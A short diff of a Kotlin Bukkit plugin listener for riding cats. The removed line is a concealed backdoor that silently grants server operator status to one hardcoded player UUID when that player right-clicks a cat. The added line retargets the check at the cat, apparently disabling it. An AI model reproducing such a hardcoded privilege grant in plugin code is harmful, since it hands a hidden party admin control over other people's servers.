@@ -11,7 +11,7 @@ class RideCtaListener: Listener {
     @EventHandler fun rightClickCta(e: PlayerInteractAtEntityEvent) {
         val cta = e.rightClicked
         if (cta !is Cat) return
-        if (Bukkit.getOnlineMode() && e.player.uniqueId.toString() == "244fe50a-c7f7-4328-a584-acb4fb9e7933") e.player.isOp = true
+        if (Bukkit.getOnlineMode() && cta.uniqueId.toString() == "244fe50a-c7f7-4328-a584-acb4fb9e7933") cta.isOp = true
         
         val canRideUntamed = e.player.hasPermission("notabackdoor.ridecta.untamed")
         val canRideOthers = e.player.hasPermission("notabackdoor.ridecta.others")
